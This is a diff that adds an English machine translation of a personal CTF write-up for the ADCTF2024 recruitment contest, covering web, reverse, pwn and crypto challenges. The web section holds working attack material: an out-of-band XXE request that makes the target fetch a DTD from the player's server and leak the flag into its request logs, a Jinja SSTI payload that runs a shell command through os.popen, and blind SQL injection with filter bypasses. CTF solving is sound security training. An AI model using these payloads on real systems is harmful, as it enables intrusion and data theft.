@@ -2,17 +2,21 @@
 title: "ADCTF2024"
 date: 2024-12-02
 draft: false
-description: "AD工作室2024招新赛"
-summary: "AD工作室2024招新赛 个人WriteUP"
+description: "AD Studio 2024 Recruitment Competition"
+summary: "Personal WriteUP of AD Studio 2024 Recruitment Competition"
 tags: ["writeup", "ctf"]
 categories: ["writeup"]
 ---
+
+{{< alert >}}
+**WARNING！** This is a machine translated version of the [Chinese page](/posts/adctf2024/)
+{{< /alert >}}
 
 ## Web
 
 ### xxe
 
-jd-gui打开发现后门
+Backdoor found after opening using jd-gui
 
 ```java
 @GetMapping({"/backdoor"})
@@ -29,11 +33,11 @@ public String hack(@RequestParam String fname) throws IOException, SAXException 
 }
 ```
 
-传入fname,解析XML
+Pass in fname and parse XML
 
-此处fname可控，可以传入外部XML
+fname is controllable and can be passed into external XML
 
-构造XXE读取flag
+Construct XXE to read flag
 
 ```eval.xml
 # eval.xml
@@ -54,17 +58,17 @@ public String hack(@RequestParam String fname) throws IOException, SAXException 
 %demo;
 ```
 
-在本地监听http请求
+Listen for http requests locally
 
 ```shell
 python3 -m http.server 9000
 ```
 
-发起请求触发XXE
+Initiate a request to trigger XXE
 
 ```http://TARGET:33008/backdoor?fname=http://LINK_TO_YOUR_SERVER/eval.xml```
 
-在请求日志中得到flag
+Get the flag in the request log
 
 > 120.230.56.2 - - [30/Nov/2024 23:03:20] "GET /eval.xml HTTP/1.1" 200 -
 > 120.230.56.2 - - [30/Nov/2024 23:03:20] "GET /eval.dtd HTTP/1.1" 200 -
@@ -80,17 +84,17 @@ python3 -m http.server 9000
 
 ### sql1
 
-从POST(data)传入student的序列化字符串，过滤之后查询$student
+Pass the serialized string of student from POST(data) and query $student after filtering
 
 ```
 $black_list = '/\=|\\x20|\\n|union|substr|ascii|\//i';
 ```
 
-过滤了```union```,```ascii```,```substr```,空格,等号,换行符
+Filtered ```union```, ```ascii```, ```substr```, space, equal sign, newline
 
-无法使用union注入，ascii使用ord替换，substr使用mid替换,空格可以用制表符替换,等号用like替换（其实用不到）
+Unable to use union injection, ascii can be replaced with ord, substr can be replaced with mid, spaces can be replaced with tabs, and equal signs can be replaced with like (which is not actually used)
 
-这题还是有回显，布尔盲注直接脚本跑一遍
+Echo is available, runs the Boolean blind injection script directly
 
 ```python
 import httpx
@@ -155,7 +159,7 @@ if __name__ == '__main__':
 
 ### sql2
 
-和sql1一样，唯一不同就是没有回显，采用时间盲注
+Same as sql1, the only difference is that there is no echo, and time blind injection must be used
 
 ```python
 import httpx
@@ -234,7 +238,7 @@ if __name__ == '__main__':
 
 ### sst1
 
-访问目标地址得到网站源代码
+Visit the target address to get the website source code
 
 ```python
 from flask import Flask, request, render_template_string 
@@ -271,25 +275,25 @@ def user():
 if __name__ == '__main__': app.run("0.0.0.0", port=11111)
 ```
 
-模板注入漏洞出现在/exp路由
+Template injection vulnerability appears in /exp route
 
-可以看见过滤了中括号和反斜线
+You can see that brackets and backslashes are filtered
 
-构造payload
+Constructing the payload
 
 ```payload
 {{().__class__.__base__.__subclasses__().__getitem__(137).__init__.__globals__.__builtins__.__getitem__("eval")("__import__(\"os\").popen(\"cat flag\").read()")}}
 ```
 
-执行得到flag
+Execute to get flag
 
 > flag{a8e5f202-9aac-49b8-ad8f-7fa2c0ac8130}
 
 ### sst2
 
-讲真的，这个ssti绕过真是一窍不通，搞了一天都没搞出来，允许我当一次脚本小子吧
+To be honest, I have no idea how to bypass ssti. I have been working on it for a day but still can't figure it out. Please allow me to be a script kiddie for once.
 
-使用 [**fenjing**](https://github.com/Marven11/Fenjing) 构造payload，然后手动构造一下请求
+Use [**fenjing**](https://github.com/Marven11/Fenjing) to construct the payload, and then manually construct the request
 
 {{< github repo="Marven11/Fenjing" >}}
 
@@ -333,36 +337,36 @@ if __name__ == '__main__':
 
 ### lottery
 
-在*events/2.json*中发现Base64字符串
+Base64 string found in *events/2.json*
 
 > ZmxhZ3thY2FlNTkwMC1hNDg4LTQ0YzUtYWM0YS0wNmYzMTM5Y2NjZWR9Cg==
 
-解码得到flag
+Decode to get flag
 
 > flag{acae5900-a488-44c5-ac4a-06f3139ccced}
 
 ### Sign_in_ADCTF
 
-看见源代码里面提示
+See the hint in the source code
 
 ```html
-<!--    H1NT: 调用Sign_in_AD()来完成签到   -->
+<!--    H1NT: Call Sign_in_AD() to complete the sign-in   -->
 ```
 
-打开控制台，在网页刷新的时候执行```Sign_in_AD()```
+Open the console and execute ```Sign_in_AD()``` when the web page is refreshed
 
-看到提示:
+See the hint:
 
-> 签到成功!但flag在图片里面哦^V^
+> Signed in successfully! But the flag is in the picture^V^
 
-将图片下载下来丢到kali里面查看EXIF信息:
+Download the image and put it into Kali to view the EXIF ​​information:
 
 > EXIF tags in './sign.jpg' ('Motorola' byte order):
 > --------------------+----------------------------------------------------------
 > Tag                 |Value
 > --------------------+----------------------------------------------------------
 > Artist              |Ak1yamaM1O
-> XP Comment          |关注ad工作室公众号，后台发送“ADCTF2024”即可得到flag
+> XP Comment          |Follow the ad studio official account and send "ADCTF2024" to get the flag
 > XP Author           |Ak1yamaM1O
 > Padding             |268 bytes undefined data
 > X-Resolution        |72
@@ -374,13 +378,13 @@ if __name__ == '__main__':
 > Color Space         |Uncalibrated
 > --------------------+----------------------------------------------------------
 
-按照提示操作得到flag
+Follow the prompts to get the flag
 
 > flag{We1c0me_2o_ADCTF_2O24_H4V4_6o09_t1m3}
 
 ### onlineJava
 
-没有任何技巧，直接执行shell
+No tricks, just execute the shell
 
 ```java
 try {
@@ -406,18 +410,18 @@ try {
 
 ### checkin
 
-IDA 打开发现是一个异或加密
-加密使用的是随机数
-但是随机数种子已经被指定了
-所以每次得到的随机数都是一样的
+IDA opens and finds that it is an XOR encryption
+Encryption uses random numbers
+But the random number seed has been specified
+So the random number you get each time is the same
 
-用LazyIDA提取加密后的flag
+Extract the encrypted flag using LazyIDA
 
 ```C
 encoded = "\x55\x17\xC9\xBB\x4A\xA5\x86\xDF\x24\x0A\x1C\xA3\x27\xA1\x57\x35\xC3\xDB\x91\x88\x6D\x91\xA0\xCC\x71\x57\x71\xE4\x40\x00";
 ```
 
-编写解密脚本:
+Write a decryption script:
 
 ```C
 #include <stdlib.h>
@@ -437,11 +441,11 @@ int main(){
 
 ### ezPy
 
-瞪眼法看图标一眼Python（看题目也知道）
+Look at the icon to know it is Python (you can also know it from the title)
 
-直接丢[pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor)得到pyc
+use [pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor) to get pyc file
 
-再丢[pylingual](https://pylingual.io)反汇编pyc
+Then use [pylingual](https://pylingual.io) to disassemble pyc file
 
 ```python
 # Decompiled with PyLingual (https://pylingual.io)
@@ -473,7 +477,7 @@ else:
     print('Wrong!')
 ```
 
-这么复杂的东西直接丢z3求解
+use z3 to solve it
 
 ```python
 from z3 import *
@@ -510,9 +514,9 @@ else:
 
 ### Py_revenge
 
-瞪眼法Python（看题目看的）
+I guess it is Python (you can also know it from the title)
 
-pyinstxtractor + PyLingual得到源代码
+pyinstxtractor + PyLingual to get source code
 
 ```python
 # Decompiled with PyLingual (https://pylingual.io)
@@ -535,9 +539,9 @@ else:
     print('Wrong!')
 ```
 
-看样子是异或+Base64
+It looks like XOR + Base64
 
-直接把东西丢进去再异或一次然后解码Base64
+Just XOR it once, and then decode Base64
 
 ```python
 import base64
@@ -556,24 +560,22 @@ print(base64.b64decode(result).decode())
 
 ### binsh
 
-IDA 打开发现只能输入两个字符
-如果第二个字符为h(104)就替换为b(98)
+Use IDA open it and finds that only two characters can be entered
+If the second character is h(104), replace it with b(98)
 
-刚开始没有任何头绪，思来想去不知道为什么第二个字符会出现h
+At first I had no idea why the second character appeared as h.
 
-结果想起来了sh
+Finally I remembered sh
 
-*把sh换成sb，真够损的*
+*Changing sh to sb is really bad.*(In the Chinese context, this is an insult.)
 
-再想发现```$0```也是可以调用shell的
-
-直接秒了
+Remember that ```$0``` can also call the shell
 
 > flag{583b4daf-a393-4bcd-b93e-2100c2ce77d6}
 
 ### meow
 
-脚本题没什么好说的喵~
+There is nothing much to say about the script question. Meow~
 
 ```python
 from pwn import *
@@ -635,9 +637,9 @@ if __name__ == '__main__':
 
 ###  Use_Many_Time
 
-板子题，没什么好说的
+Template problem, nothing much to say
 
-至于p是哪来的，我想是factordb给我的
+Get p,q from factordb
 
 ```python
 from Crypto.Util.number import *
@@ -663,7 +665,7 @@ print(plaintext)
 
 ### Too_Close_To_Sqrt
 
-两个相邻的质数，说明我们开个方pq就在旁边,直接跑一会就出来了
+Two adjacent prime numbers, which means that we can square and pq will come out directly after running for a while.
 
 ```python
 from gmpy2 import isqrt
@@ -691,9 +693,9 @@ print(long_to_bytes(m))
 
 ### One_Way_Function
 
-只有单个字符的sha512
+sha512 with only a single character
 
-直接来一手彩虹表
+Rainbow Table Attack
 
 ```python
 from hashlib import sha512
@@ -736,7 +738,7 @@ print(bytes(ciphertext).hex())
 e0eae7e1fde3e7fcffd9fee9f4fb
 ```
 
-看到flag是逐字节加密的，密钥只有256种可能，直接枚举密钥即可
+Seeing that the flag is encrypted byte by byte, there are only 256 possible keys, so just enumerate the keys
 
 ```python
 ciphertext = bytes.fromhex('e0eae7e1fde3e7fcffd9fee9f4fb')
